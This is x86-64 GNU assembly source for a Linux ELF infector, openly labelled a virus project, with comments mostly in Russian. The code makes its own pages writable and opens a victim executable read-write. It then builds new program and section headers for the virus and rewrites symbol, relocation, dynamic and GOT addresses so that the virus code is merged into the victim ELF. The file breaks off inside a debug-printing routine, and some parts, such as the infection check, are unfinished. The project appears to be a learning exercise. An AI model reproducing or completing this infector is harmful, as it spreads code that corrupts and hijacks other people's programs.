/// Example of ELF-infector (GNU/Linux virus project)
/// Copyright () Rigidus & 0xBECEDA 2020-2021
/// XREF: https://github.com/0xBECEDA/malware
/// LICENSE: Gnu Public Licence v.3

/// Compile:
///      gcc malware.s -nostdlib -o asm
/// или:
///      as malware.s -nostdlib -o asm.o
///      ld asm.o -o asm
/// также cmdstring для отладки макросов:
/// as -a malware.s -nostdlib -o asm
/// ключ -a позволяет увидеть генерацию макросов

/// TLDR & TOC:
/// - define C-constants
/// - macro declararations
/// - defuine .set-constants
/// - .text of pseudo-victim
/// - .data of pseudo-victim
/// - .text of infector
///   + _start_infector
///   + ...
///   + _test_file_infection
///   + ...
///   + _my_mmap
///   + _my_stat
///   + _openfile
///   + ...
///   + _canary
///   + STACK
///   + ...
///   + _my_write
///   + _error_msg
///   + _end_infector
///   + _fin_infector

/// Полезное или может пригодиться:
/// https://reverse.put.as/wp-content/uploads/2011/03/gdbreferencecard.html
/// https://cs.lmu.edu/~ray/notes/gasexamples/
/// https://stackoverflow.com/questions/14361248/whats-the-difference-of-section-and-segment-in-elf-file-format
/// http://tigcc.ticalc.org/doc/gnuasm.html#SEC39
/// https://www.opennet.ru/docs/RUS/gas/gas-4.html


/// Если эта переменная существует,
/// макросы будут генерировать отладочный вывод
    .set DEBUG_MODE, 1

/// CANARY
/// Мы хотим проверять, что стек не переполнен
/// Поэтому мы размещем значение-канарейку, которое
/// будет затерто если стек будет переполнен и
/// создаем макрос для проверки этого значения
#define CANARY_VAL 0xDEADBEEFBAADF00D

/// MACRO--------------------------------------

    // https://www.opennet.ru/docs/RUS/gas/gas-7.html#ss7.38
    // \@ хранит счетчик, содержащий число, которое
    // показывает, сколько раз был выполнен этот
    // макрос; вы можете вывести это число при
    // помощи \@, но только внутри определения макроса.

    .macro CHECK_CANARY
        .ifdef DEBUG_MODE
            mov     _canary(%rip), %rax
            mov    $CANARY_VAL, %rbx
            cmp    %rax, %rbx
            je      1f              # forward label 1
            lea     2f(%rip), %rsi  # forward label 2
            mov     $len_e_canary_\@, %rdx
            jmp     _error_msg
        2:
            .string "ERR: canary \@\n"
            .set len_e_canary_\@, . - 2b
        1:
        .endif
    .endm

    // Макрос для генерации сообщений об ошибках

    .macro ERR_MSG name msg
        .ifdef DEBUG_MODE
            \name\()_error:
                lea     \name\()_msg_e(%rip), %rsi
                mov     $len_e_\name, %rdx
                // call    _my_write
                // xor     %rax, %rax
                // jmp     \name\()_exit
                jmp     _error_msg
            \name\()_msg_e:
                .ascii "ERR: \msg\()\n"
                .set len_e_\name, . - \name\()_msg_e
        .else
            \name\()_error:
                jmp     \name\()_exit
        .endif
    .endm

    // Макрос для печати строки
    // NB!: давай макросы к макросам, а код - к коду

    .macro PRINT_STR name msg
        lea     \name\()_msg_print(%rip), %rsi
        mov     $len_e_\name, %rdx
        call    _my_write
        jmp     \name\()_end
    \name\()_msg_print:
        .ascii "\msg\()\n "
        .set len_e_\name, . - \name\()_msg_print
    \name\()_end:
    .endm

    // Конвертирует и печатает число, находящееся
    // по заданному адресу

    .macro CNVRT_NUM num_addr

        // BN: ты прав, очистка не нужна, код удален
        // растянули число на 16 байт
        lea     \num_addr\()(%rip), %rdx
        mov     (%rdx), %rdi
        call    cnvrt_addr_in_16_byte

        // сконвертировали число в ascii коды
        lea     byted_addr(%rip), %rsi
        call    cnvrt_num_to_hex_string

        // вывод числа
        lea     converted_addr(%rip), %rsi
        mov     $0x11, %rdx
        call    _my_write

        // вывод доп. перевода строки
        lea     newline(%rip), %rsi
        mov     $0x1, %rdx
        call    _my_write

    .endm



/// CONST--------------------------------------

    .set O_RDONLY, 0x0
    .set O_RDWR, 0x2
    .set MAP_PRIVATE, 0x2
    .set PROT_NONE, 0x0
    .set PROT_READ, 0x1
    .set PROT_WRITE, 0x2
    .set PROT_EXEC, 0x4
    .set PROT_READ_OR_PROT_WRITE, 0x3
    .set O_RDWR_AND_O_APPEND, 0x402
    .set ELF_E_ENTRY, 0x18
    .set ELF_E_PHOFF, 0x20
    .set ELF_E_SHOFF, 0x28
    .set ELF_E_PHNUM, 0x38
    .set ELF_E_SHNUM, 0x3c
    .set PHDR_P_OFFSET, 0x8
    .set PHDR_P_VADDR, 0x10
    .set PHDR_P_PADDR, 0x18
    .set PHDR_P_FILESZ, 0x20
    .set PHDR_P_MEMSZ, 0x28
    .set SHDR_SH_ADDR, 0x10
    .set SHDR_SH_TYPE, 0x4
    .set SHDR_SH_SIZE, 0x20

    // .macro ADDR_MASQUE reg
//     mov $0xF, \reg
// .endm

/// На случай если инфектор будет слинкован
/// с другими библиотеками, лучше сделать так,
/// чтобы его код был в отдельной подсекции -
/// так проще его извлекать.
///
/// Тогда основная подсекция будет содержать
/// код псевдо-жертвы:

/// CODE 0-------------------------------------
    .text 0

    .global	_start
	.type	_start, @function

_start:
    jmp     _start_infector
_start_victim:
    lea     _msg_victim(%rip), %rsi
    mov     $len_msg_victim, %rdx
    mov     $0x1, %rax          # write
    mov     %rax, %rdi          # to stdout
    syscall

    lea    _exit_victim(%rip), %rsi
    jmp    *%rsi

// _exit_victim:
//     mov $0x3c, %rax
//     mov $0x0,  %rdi
//     syscall


/// DATA 0-------------------------------------
/// данные псевдо-жертвы
/// не обозначает как .data, потому что
/// в противном случае, по неизвестной мне причине,
/// и при сработавшем mprotect, если использовать директиву
/// .data, то любой call вируса после заражения оборачивается
/// сегфолтом
_msg_victim:
    .ascii "Hello, I am victim\n"
    .set len_msg_victim, . - _msg_victim

fd:
    .quad 0

move_victim_offset:
    .quad 0

victim_elf_addr:
	.quad 0

victim_phdr_table_addr:
	.quad 0

victim_phdr_table_size:
	.quad 0

victim_phdr_amount:
	.quad 0

victim_shdr_table_addr:
	.quad 0

victim_shdr_table_size:
	.quad 0

victim_shdr_amount:
    .quad 0

infected_seg_phdr_addr:
	.quad 0

infected_seg_end_vaddr:
	.quad 0

last_seg_vaddr_end:
    .quad 0

infected_seg_size:
	.quad 0

infected_sect_shdr_addr:
	.quad 0

victim_code_size:
    .quad 0

victim_code_addr:
    .quad 0

victim_code_frm_begin_vaddr:
    .quad 0

victim_code_offset:
    .quad 0

victim_code_before_infect_point_size:
	.quad 0

victim_code_after_infect_point_addr:
	.quad 0

victim_code_after_infect_point_size:
	.quad 0

virus_code_addr:
	.quad 0

virus_code_size:
	.quad 0

symtab_shdr_addr:
	.quad 0

symtab_records_amount:
	.quad 0

dynamic_records_offset:
	.quad 0

dynamic_records_size:
	.quad 0

dynamic_records_vaddr:
    .quad 0

dynamic_records_amount:
	.quad 0

original_e_entry:
	.quad 0

offset_to_e_entry:
	.long 0

virus_new_phdr:
    .space 56, 0

virus_new_shdr:
    .space 64, 0

sh_name_indx:
    .long 0

first_seg_vaddr:
	.quad 0

GOT_vaddr:
	.quad 0

_canary:
    .quad CANARY_VAL

_stack_top:
    .space 6000, 0
_stack_bottom:
    .quad 0

// dnt_exist_filenm:
//     .string  "test2.txt"

// file_name2:
//     .string  "asm-test2.txt"

_file_name3:
    .string  "example"

_victim_nolibs_filenm:
    .string  "victim"

virus_file_name:
    .string  "asm"

small_virus_file_name:
    .string  "virus"

new_elf_file:
    .string "test_inf"

newline:
    .ascii "\n"
byted_addr:
    .space  16, 0

/// CODE 1-------------------------------------
/// Подсекция кода инфектора
    .text 1

/// INTENT:
/// ~~~~~~
/// Мы хотим разрешить самомодифицирующийся код.
/// Для этого мы должны передать MPROTECT выровненный
/// адрес - т.е. кратный размеру страницы (в моей архитектуре это 4 кб)
/// Этот адрес должен быть выше адреса _start_infector.
/// Он совпадает с адресом начала сегмента кода,
/// но мы не можем быть в этом уверены, когда находимся
/// в зараженном файле.

 	.global	_start_infector
	.type	_start_infector, @function
_start_infector:

    // сохраняем все регистры, кроме rsp и rbp,
    // какими они были до старта вируса

    // -=:[ Разрешаем писать себе в код ]:=-

    // lea     _start_infector(%rip), %rdi
    lea     _start(%rip), %rdi
    and     $~0xFFF, %rdi       # ..in %RDI
    lea     _fin_infector(%rip), %rsi   # get end addr
    // lea     _exit_infector(%rip), %rsi   # get end addr

    sub     %rdi, %rsi          # total size - %RSI
    // CALL MPROTECT            # start addr - %RDI
    mov     $0x7, %rdx            # RW+EXEC flags - $RDX
    mov     $0xA, %rax            # mprotect handle
    syscall
    test    %rax, %rax
    jz      _mprotect_is_ok
    // ------------------------ #
    ERR_MSG mprotect "mprotect in _start"

old_rsp:
    .quad 0     # вершина стека жертвы

old_rax:
    .quad 0

old_rbx:
    .quad 0

old_rdx:
    .quad 0

old_rcx:
    .quad 0

old_rdi:
    .quad 0

old_rsi:
    .quad 0

old_r8:
    .quad 0

old_r9:
    .quad 0

old_r10:
    .quad 0

old_r11:
    .quad 0

old_r12:
    .quad 0

old_r13:
    .quad 0

old_r14:
    .quad 0

old_r15:
    .quad 0

    // ------------------------ #
_mprotect_is_ok:
    // Set Stack
    mov     %rsp, old_rsp(%rip)     # save old %RSP
    lea     _stack_bottom(%rip), %rsp

    mov     %rax, old_rax(%rip)
    mov     %rbx, old_rbx(%rip)
    mov     %rdx, old_rdx(%rip)
    mov     %rcx, old_rcx(%rip)
    mov     %rdi, old_rdi(%rip)
    mov     %r8, old_r8(%rip)
    mov     %r9, old_r9(%rip)
    mov     %r10, old_r10(%rip)
    mov     %r11, old_r11(%rip)
    mov     %r12, old_r12(%rip)
    mov     %r13, old_r13(%rip)
    mov     %r14, old_r14(%rip)
    mov     %r15, old_r15(%rip)

    // -=:[ Разбор файла жертвы ]:=-
    // NB!: Перенес test_file_infection cюда

    lea     _file_name3(%rip), %rdi
    // lea     _victim_nolibs_filenm(%rip), %rdi
    // получить данные жертвы
    call    _get_victim_data
    // call    _print_victim_data_fn
    // получить данные вируса
    call    _get_virus_code
    // call    _print_virus_data_fn
    // найти точку для заражения
    call    _find_point_for_infection
    // call    _print_infection_data_fn
    // отредактировать поля заголовков
    call    _recount
    lea     new_elf_file(%rip), %rdi
    // записать код вируса и жертвы в новый эльф
    call    _recombine_elf

_canary_test:
    CHECK_CANARY
    jmp     _end_infector

// _FIND_VICTIM_TEXT_SECTION
// PARAMS
// - %RDI - shdr addr table
// - %RSI - shdr amount
// - %RDX - e_entry
//
// находит секцию text для заражения -
// этот сегмент содержит e_entry
//
// Как понять, что сегмент содержит e_entry:
// его sh_addr <= e_entry,
// его sh_addr + sh_size > e_entry
/// Этот заголовко секции  нужен, чтоб прочитать его sh_name -
/// индекс в таблице строк, его же присвоим новому заголовку
/// секции вируса

    .globl  _find_victim_text_section
	.type	_find_victim_text_section, @function
_find_victim_text_section:
    push    %rbx
    push    %rcx
    push    %rax

    mov     %rsi, %rcx

_find_victim_text_section_cycle:
    mov     %rdi, %rax

    mov     SHDR_SH_ADDR(%rdi), %rbx     # получаем поле sh_addr

    cmp     %rdx, %rbx  # addr долен быть <= e_entry
    // иначе переход на следующую итерацию
    jg      _next_iter_find_text

    mov    %rax, %rdi
    mov    SHDR_SH_SIZE(%rdi), %rsi # размер текущего секц.

    add    %rsi, %rbx   # адрес конца текущeго сегмент

    cmp    %rdx, %rbx   # cur sect. end > e_entry
    jl     _next_iter_find_text

    jmp    _find_text_success   # section is found
_next_iter_find_text:

    add     $0x40, %rax
    mov     %rax, %rdi

    loop    _find_victim_text_section_cycle
    jmp     _find_text_section_error # noting is fund

_find_text_success:
    leaq    sh_name_indx(%rip), %rcx
    movl    (%rax), %edx
    movl    %edx, (%rcx)  # save sect. sh_name

_find_text_exit:
    pop     %rax
    pop     %rcx
    pop     %rbx

    ret

    ERR_MSG _find_text_section "_find_text_sect.: No text section found"

 // _FIND_FIRST_SEG_VADDR
/// PARAMS
/// RDI -  указатель на заголовки,
/// RSI -  их количество
/// Ищет виртуальный адрес первого сегмента кода
/// - у него будет 0 смещение
_find_first_seg_vaddr:

    push    %rcx
    mov     %rsi, %rcx        # установили счетчик цикла
_find_first_seg_vaddr_cycle:

    mov     PHDR_P_OFFSET(%rdi), %rsi
    cmp     $0, %rsi
    jne     _find_first_seg_vaddr_next

    add     $0x10, %rdi
    cmp     $0, (%rdi)
    jne     _find_first_seg_vaddr_success

    sub     $0x10, %rdi
_find_first_seg_vaddr_next:
    add     $0x38, %rdi
    loop    _find_first_seg_vaddr_cycle

    jmp     _find_first_seg_vaddr_error

_find_first_seg_vaddr_success:
    leaq    first_seg_vaddr(%rip), %rsi
    mov     (%rdi), %rdi
    mov     %rdi, (%rsi)

_find_first_seg_vaddr_exit:
    pop     %rcx
    ret

    ERR_MSG _find_first_seg_vaddr "_find_first_seg_vaddr: No segment found"

/// _FIND_LAST_SEG_VADDR
/// PARAMS
/// RDI -  указатель на заголовки,
/// RSI -  их количество
/// Ищет виртуальный адрес первого сегмента кода
/// - у него будет 0 смещение
_find_last_seg_vaddr:
    push    %rcx
    push    %r8
    push    %rax

    mov     %rdi, %r8
    mov     %rsi, %rcx        # установили счетчик цикла
_find_last_seg_vaddr_cycle:

    cmp     $1, (%rdi)
    jne     _find_last_seg_vaddr_next

    mov     PHDR_P_VADDR(%rdi), %rsi
    mov     PHDR_P_VADDR(%r8), %rax

    cmp     %rax, %rsi
    jg      _set_last_seg
    jmp     _find_last_seg_vaddr_next

_set_last_seg:
    mov     %rdi, %r8

_find_last_seg_vaddr_next:
    add     $0x38, %rdi
    loop    _find_last_seg_vaddr_cycle

_find_last_seg_vaddr_success:
    leaq    last_seg_vaddr_end(%rip), %rsi

    mov     PHDR_P_VADDR(%r8), %rax
    mov     PHDR_P_MEMSZ(%r8), %rdi

    add     %rax, %rdi
    add     $0x38, %rdi # (все сместится на 56 байт)
    mov     %rdi, (%rsi)

    // mov     $0x601a18, %rdi
    mov     %rdi, (%rsi)

_find_last_seg_vaddr_exit:
    pop     %rax
    pop     %r8
    pop     %rcx
    ret


/// _GENERATE_VIRUS_PHDR
/// генерирует заголовок сегмента для кода вируса
/// PARAMS - no
_generate_virus_phdr:
    push    %rbx
    push    %rax
    push    %rcx

    leaq    virus_new_phdr(%rip), %rax

    movb    $0x1, (%eax) # p_type
    add     $0x4, %rax

    movb    $0x5, (%eax) # p_flags
    add     $0x4, %rax

    leaq    victim_elf_addr(%rip), %rbx
    mov     (%rbx), %rbx
    mov     ELF_E_SHOFF(%rbx), %rbx
    add     $0x38, %rbx

    movq    %rbx, (%rax) # p_offset 0x1a18
    add     $0x8, %rax

    leaq    infected_seg_end_vaddr(%rip), %rbx
    // leaq    last_seg_vaddr_end(%rip),%rbx
    movq    (%rbx), %rbx

    movq    %rbx, (%rax) # vaddr
    add     $0x8, %rax

    movq    %rbx, (%rax) # paddr
    add     $0x8, %rax

    leaq    virus_code_size(%rip), %rbx
    mov     (%rbx), %rbx

    movq    %rbx, (%rax) # p_filesz

    // к размеру кода добавили блок данных жертвы
    leaq    data_size(%rip), %rcx
    mov     (%rcx), %rcx
    add     %rcx, (%rax)

    add     $0x8, %rax

    movq    %rbx, (%rax) # p_memsz
    add     %rcx, (%rax)

    add     $0x8, %rax

    # поле p_allign при инициализации
    # заполнено нулями, что и нужно

    pop     %rcx
    pop     %rax
    pop     %rbx
    ret

    // 6015b0
/// _GENERATE_VIRUS_SHDR
/// генерирует заголовок секции для кода вируса
/// PARAMS - no
_generate_virus_shdr:
    push    %rbx
    push    %rax

    leaq    virus_new_shdr(%rip), %rax
    leaq    sh_name_indx(%rip), %rbx

    movl    (%rbx), %ebx  # sh_name
    movl    %ebx,  (%rax)
    add     $0x4, %rax

    movb    $0x1, (%rax)  # sh_type
    add     $0x4, %rax

    movb    $0x6, (%rax)  # sh_flags
    add     $0x8, %rax

    leaq    infected_seg_end_vaddr(%rip), %rbx
    // leaq    last_seg_vaddr_end(%rip), %rbx
    mov     (%rbx), %rbx

    mov     %rbx, (%rax)  # sh_addr
    add     $0x8, %rax

    leaq    victim_elf_addr(%rip), %rbx
    mov     (%rbx), %rbx

    mov     ELF_E_SHOFF(%rbx), %rbx
    add     $0x38, %rbx
    mov     %rbx, (%rax)  # sh_offset
    add     $0x8, %rax

    leaq    virus_code_size(%rip), %rbx
    mov     (%rbx), %rbx

    leaq    data_size(%rip), %rcx
    mov     (%rcx), %rcx

    mov     %rbx, (%rax) # sh_size
    add     %rcx, (%rax)

    add     $0x8, %rax

    # поля sh_link, sh_info, sh_addralign, sh_entsize
    # при инициализации записаны нулями,
    # а нам и нужно чтоб они были
    # заполнены нулями

    pop     %rax
    pop     %rbx

    ret

// FIND_SYMTAB_CODE
// Ищет среди всех заголовков секций заголовк symtab - этот заголовок описывает
// таблицу символов. Ищем по типу заголовка - у symtab этот тип 2, symtab может быть
// в файле в единственном числе
// PARAMS:
// RDI - указатель нa таблицу заголвоков секций
// RSI - количество заголовков
_find_symtab:
    push    %rcx
    push    %rdx

    mov     %rsi, %rcx
_find_symtab_cycle:
    mov     %rdi, %rsi
    mov     SHDR_SH_TYPE(%rdi), %rdx

    cmp     $0x2, %rdx   # shdr = symtab?
    je      _find_symtab_success

    add     $0x40, %rsi
    mov     %rsi, %rdi
    loop    _find_symtab_cycle

_find_symtab_success:
    leaq    symtab_shdr_addr(%rip), %rdi
    mov     %rsi,  (%rdi)

    // считаем кол-во записией в symtab
    // symtab size / symtab record size = rec. amount
    mov     SHDR_SH_SIZE(%rsi), %rdx
    mov     $0x18, %ecx
    movl     %edx, %eax
    xor      %rdx, %rdx
    idivl    %ecx

    leaq    symtab_records_amount(%rip), %rdi
    mov     %rax, (%rdi)

_find_symtab_fail:
    pop     %rdx
    pop     %rcx

    ret

/// _RECOUNT_SYMBOLS_ADDRS
// Редактирует vaddr символов
// PARAMS:
// RDI - указатель на заголовок symtabs
// RSI - количество записей в symtab
/// RDX - константа, на которую увеличивается
/// vaddr
_recount_symbols_addrs:
    push    %rcx
    push    %rax
    test    %rdi, %rdi
    je      _recount_symbols_addrs_exit
    mov     %rsi, %rcx

    // указатель на первую запись в symtab
    //
    leaq    victim_elf_addr(%rip), %rsi
    mov     (%rsi), %rsi
    add     $0x18, %rdi
    add     (%rdi), %rsi
    mov     %rsi, %rdi

_recount_symbols_addrs_cycle:
    add     $0x8, %rdi   # offset до vaddr символа

    cmp     $0, (%rdi)
    je      _recount_symbols_next_iter

    add     %rdx, (%rdi)  # сместили на разм. virus code

_recount_symbols_next_iter:
    add     $0x10, %rdi
    loop    _recount_symbols_addrs_cycle

_recount_symbols_addrs_exit:
    pop     %rax
    pop     %rcx
    ret

/// _RECOUNT_RELA_SECTION
/// увеличивает vaddr релокейта на заданную величину
/// RDI - offset до секции rela
/// RSI - значение, на которое увеличивается vaddr
/// RDX - размер секции rela
_recount_rela_section:
    push    %rax
    push    %rcx

    // посчитали кол-во записей
    // в секции rela
    mov     %edx, %eax
    xor     %rdx, %rdx
    mov     $0x18, %ecx
    idiv    %ecx
    mov     %eax, %ecx

    //  получили адрес кода секции в памяти
    leaq    victim_elf_addr(%rip), %rax
    mov     (%rax), %rax
    add     %rdi, %rax

_recount_rela_section_cycle:
    // vaddr релокейта + константа
    cmp     $0, (%rax)
    je      _recount_rela_next_iter

    add     %rsi, (%rax)

_recount_rela_next_iter:
    add     $0x18, %rax   # сдвиг на след. запись
    loop    _recount_rela_section_cycle

_recount_rela_section_exit:
    pop     %rcx
    pop     %rax

    ret


/// _RECOUNT_DYNAMIC_SECTION
/// редактирует vaddr кода, описываемого записями в dynamic,
/// а так же находит запись GOT и сохраняет ее vaddr
/// RDI - адрес секции dynamic
/// RSI - константа, на которую увеличится vaddr
/// во всех записях dynamic
/// RDX - размер секции dynamic
/// RCX - базовый виртуальный адрес эльфа
_recount_dynamic_section:
    push    %rax
    push    %r8

    mov     %rcx, %r8

    cmp     $0, %rdi
    je      _recount_dynamic_section_exit

    mov     %edx, %eax
    xor     %rdx, %rdx
    mov     $0x10, %ecx
    idiv    %ecx
    mov     %eax, %ecx

    mov     %r8, %rdx
    mov     %rdi, %rax

_recount_dynamic_section_cycle:
    cmpl    $0x3, (%rax)
    je     _save_got_vaddr
    jmp    _recount_vaddr

    // редактируем и сохраняем vaddr GOT
_save_got_vaddr:
    add     $0x8, %rax  # пропустили тип

    add     %rsi, (%rax)

    leaq    GOT_vaddr(%rip), %rdi

    push    %rax

    mov     (%rax), %rax
    mov     %rax, (%rdi)

    pop     %rax

    jmp    _recount_dynamic_section_next_iter
    // пересчитываем адрес релокейта,
    // если он не нулевой
_recount_vaddr:
    add     $0x8, %rax  # пропустили тип

    cmp     %rdx,  (%rax)
    jle     _recount_dynamic_section_next_iter

    // vaddr релокейта + константа
    add     %rsi, (%rax)

_recount_dynamic_section_next_iter:
    add     $0x8, %rax    # сдвиг на след. запись
    loop    _recount_dynamic_section_cycle

_recount_dynamic_section_exit:
    pop     %rcx
    pop     %rax
    ret

///  _EDIT_GOT_RECORDS
/// подготоавливает параметры и вызывает
/// редактирование записей GOT
/// Поскольку редактирование GOT происходит
/// после редактирования shdrs, то нужно помнить,
/// что в оригинальном файле смещение и адрес будут
/// меньше на 56 байт
/// PARAMS
/// RDI - указатель на таблицу shdrs
/// RSI - количество shdrs
/// RDX - виртуальный адрес GOT
_edit_got_records:
    push    %rcx
    mov     %rsi, %rcx

_edit_got_records_cycle:
    add     $0x10, %rdi

    cmp     %rdx, (%rdi)
    je      _edit_got_records_success
    jmp     _edit_got_records_next

_edit_got_records_next:
    add      $0x30, %rdi
    loop    _edit_got_records_cycle

    jmp     _edit_got_records_error
_edit_got_records_success:
    add     $0x8, %rdi # sh_offset
    mov     (%rdi), %rcx
    sub     $0x38, %rcx

    add     $0x8, %rdi  # sh_size
    mov     (%rdi), %rdx

    mov     %rcx, %rdi
    mov     $0x38, %rsi

    call    _recount_got_section
_edit_got_records_exit:
    pop    %rcx
    ret

    ERR_MSG   _edit_got_records "edit_got_records: No such GOT vaddr"

/// _GET_VIRUS_CODE
/// @PARAMS - no
///
/// Читает указатель начала кода вируса и размер этого
/// кода.
/// Записывает адрес кода вируса в virus_code_addr и
/// размер этого кода в virus_code_size
/// NB!: Есть мнение, что достаточно найти
/// сигнатуру начала вируса а длину мы можем
/// вычислить на стадии компиляции. Это можно сделать
/// прямо в памяти, без открытия файла. А если мы это
/// делаем в памяти, то мы из любой точки можем
/// посчитать относительное расстояние до метки
/// _infector_start, так что даже и без сигнатуры можно
/// обойтись.
_get_virus_code:

    leaq    _start(%rip), %rdi  # начало вируса
    leaq    virus_code_addr(%rip), %rsi
    mov     %rdi, (%rsi)

    // leaq    _fin_infector(%rip), %rsi
    leaq    _exit_victim(%rip), %rsi
    sub     %rdi, %rsi  # virus size до exit_victim

    # exit + размер команд jmp, nop
    add     $0xB, %rsi
    // add     $0x6, %rsi

    leaq    virus_code_size(%rip), %rdi
    mov     %rsi, (%rdi)

    ret

// _CHECK_FILE_INFECTION
// Проверяет, является ли открытый файл эльфом
// и есть ли в нем вирус
// - проверить магические байты в заголовке эльфа
// - проверить размер файла - если меньше размера
// вируса, искать не имеет смысла
// - иначе найти
// Возвращает 1 в RAX в случае, если файл не заражен
// и 0 если заражен
// PARAMS - no
_check_file_infection:

    push    %rbx
    push    %rdx
    push    %rcx

    leaq    victim_elf_addr(%rip), %rax
    mov     (%rax), %rax

    // ... поиск по сигнатуре магических байт?...
    // ....

    // сравниваем размер кода вируса и
    // размер кода жертвы
    mov     ELF_E_PHOFF(%rax), %rbx
    mov     ELF_E_SHOFF(%rax), %rdx

    sub     %rbx,  %rdx

    leaq    virus_code_size(%rip), %rcx
    mov     (%rcx), %rcx

    cmp     %rdx, %rcx
    jge     _file_withput_virus

    // проверяем, заражен ли файл


_file_withput_virus:
    mov     $0x1, %rax
    jmp     _check_file_infection_exit

_file_with_virus:
    mov     $0x0, %rax
    jmp     _check_file_infection_exit

_check_file_infection_exit:

    pop  %rcx
    pop  %rdx
    pop  %rbx

    ret


/// _GET_VICTIM_DATA
/// @PARAMS
/// - % RDI - имя жертвы
///
/// Высчитывает и заполняет переменные:
/// - адрес начала эльфа в памяти
/// записывается в victim_elf_add
/// - адрес теблицы заголовков программ
///   в victim_phdr_table_addr
/// - количество заголовов программ
///   в victim_phdr_amount
/// - сколько места они занимают все вместе
///   в victim_phdr_table_size
/// - адрес теблицы заголовков секций
///   в victim_shdr_table_addr
/// - количество заголовов  секций
///   в victim_shdr_amount
/// - сколько места они занимают все вместе
///   в victim_shdr_table_size
/// - адрес начала кода жертвы
///   в victim_code_before_infect_point_addr

_get_victim_data:
   	push    %rax
	push    %rbx
	push    %rcx
	push    %rdx
    push    %rsi

    mov     $O_RDWR, %rsi
    call    _openfile

    // NB!: Зачем нужно сначала брать адрес, а потом
    // записывать по нему, что мешает сразу записать?
    leaq    victim_elf_addr(%rip), %rdi
    mov     %rax, (%rdi)    # save elf victim addr

    mov     %rax, %rsi      # elf victim addr
    mov     %rax, %rdi

    // посчитать адрес, количество и сколько места
    // занимает таблица заголовков сегментов
    mov     ELF_E_PHOFF(%rdi), %rcx
    add     %rcx, %rsi      # phdr table addr 0x7ffff7ff7040

    leaq    victim_phdr_table_addr(%rip), %rdx
    mov     %rsi, (%rdx)    # save phdr table addr

    mov     %rax, %rdi      # phdr amount
    mov     ELF_E_PHNUM(%rdi), %ecx
    movzwl  %cx, %ecx

    leaq    victim_phdr_amount(%rip), %rdx
    mov     %rcx, (%rdx)    # save phdr table amount

    mov     $0x38, %rdx
    imul    %rcx,  %rdx     # phrd table size

    leaq    victim_phdr_table_size(%rip), %rcx
    mov     %rdx, (%rcx)    # save phrd table size

    // посчитать адрес, количество и сколько места
    // занимает таблица заголовков секций
    mov     %rax, %rdi
    mov     %rax, %rsi

    mov     ELF_E_SHOFF(%rdi), %rcx
    add     %rcx, %rsi      # shdr table addr 0x7ffff7ff89e0

    leaq    victim_shdr_table_addr(%rip), %rdx
    mov     %rsi, (%rdx)

    mov     %rax, %rdi
    mov     ELF_E_SHNUM(%rdi), %ecx  # shdr amount
    movzwl  %cx, %ecx

    leaq    victim_shdr_amount(%rip), %rdx # save shdr amount
    mov     %rcx, (%rdx)

    mov     $0x40, %rdx
    imul     %rcx,  %rdx    # shdr table size

    leaq    victim_shdr_table_size(%rip), %rcx  # save shdr table size
    mov     %rdx, (%rcx)

    // посчитать размер кода жертвы

    leaq    victim_phdr_table_size(%rip), %rcx
    mov     (%rcx), %rcx

    leaq    victim_code_offset(%rip), %rdx  # save victim code addr
    mov     %rcx, (%rdx)
    add     $0x40, (%rdx)


    leaq    victim_phdr_table_addr(%rip), %rdx
    mov     (%rdx), %rdx

    add     %rdx, %rcx    # 0x7ffff7ff7238

    leaq    victim_code_addr(%rip), %rdx  # save victim code addr
    mov     %rcx, (%rdx)

    leaq    victim_shdr_table_addr(%rip), %rdx
    mov     (%rdx), %rdx

    sub     %rcx, %rdx

    leaq    victim_code_size(%rip), %rcx  # save victim code size
    mov     %rdx, (%rcx)

    pop     %rsi
	pop     %rdx
	pop     %rcx
	pop     %rbx
    pop     %rax

    ret

/// _PRINT_VICTIM_DATA_fn
/// @PARAMS - no
/// Печатает значени переменных:
/// - victim_elf_addr
/// - victim_phdr_table_addr
/// - victim_phdr_amount
/// - victim_phdr_table_size
/// - victim_shdr_table_addr
/// - victim_shdr_amount
/// - victim_shdr_table_size
/// - victim_code_before_infect_point_size
/// - victim_code_after_infect_point_addr
/// - victim_code_after_infect_point_size
_print_victim_data_fn:
    PRINT_STR print_victim_data1 "-------------------- \n"
    PRINT_STR print_victim_data2 "PRINT_VICTIM_DATA \n \n"

    PRINT_STR victim_elf_addr "victim_elf_addr val: "
    CNVRT_NUM victim_elf_addr

    PRINT_STR victim_phdr_table_addr "victim_phdr_table_addr val: "
    CNVRT_NUM victim_phdr_table_addr

    PRINT_STR victim_phdr_amount "victim_phdr_amount val: "
    CNVRT_NUM victim_phdr_amount

    PRINT_STR victim_phdr_table_size "victim_phdr_table_size val: "
    CNVRT_NUM victim_phdr_table_size

    PRINT_STR victim_shdr_table_addr "victim_shdr_table_add  val: "
    CNVRT_NUM victim_shdr_table_addr

    PRINT_STR victim_shdr_amount "victim_shdr_amount val: "
    CNVRT_NUM victim_shdr_amount

    PRINT_STR victim_shdr_table_sz "victim_shdr_table_size val: "
    CNVRT_NUM victim_shdr_table_size

    PRINT_STR victim_code_b_inf_point_sz "victim_code_before_infect_point_size val: "
    CNVRT_NUM victim_code_before_infect_point_size

    PRINT_STR victim_code_a_inf_pnt_addr "victim_code_before_infect_point_addr val: "
    CNVRT_NUM victim_code_after_infect_point_addr

    PRINT_STR victim_code_a_infect_point_sz "victim_code_before_infect_point_size val: "
    CNVRT_NUM victim_code_after_infect_point_size

    PRINT_STR print_victim_end "--------------------\n"

    ret

// Печатает данные вируса: адрес его кода в памяти и размер этого кода
_print_virus_data_fn:

    PRINT_STR print_virus_data1 "--------------------\n"
    PRINT_STR print_virus_data2 "PRINT_VIRUS_DATA \n \n"

    PRINT_STR  virus_code_addr "virus_code_addr val: "
    CNVRT_NUM  virus_code_addr

    PRINT_STR  virus_code_size "virus_code_size val: "
    CNVRT_NUM  virus_code_size

    PRINT_STR print_virus_end "-------------------- \n"

    ret

phdr_field_ptr:
    .quad 0

_print_virus_new_phdr_fn:

    push    %rax
    push    %rbx
    push    %rcx

    PRINT_STR  virus_phdr1 "-------------------- \n"

    leaq    virus_new_phdr(%rip), %rax

    leaq    phdr_field_ptr(%rip), %rbx

    movl     (%rax), %ecx
    mov      %ecx, (%rbx)
    push     %rax
    CNVRT_NUM  phdr_field_ptr

    pop      %rax
    add     $0x4, %rax

    movl     (%rax), %ecx
    mov      %ecx, (%rbx)
    push     %rax
    CNVRT_NUM  phdr_field_ptr

    pop      %rax
    add     $0x4, %rax

    mov     (%rax), %rcx
    mov      %rcx, (%rbx)
    push     %rax
    CNVRT_NUM  phdr_field_ptr

    pop      %rax
    add     $0x8, %rax

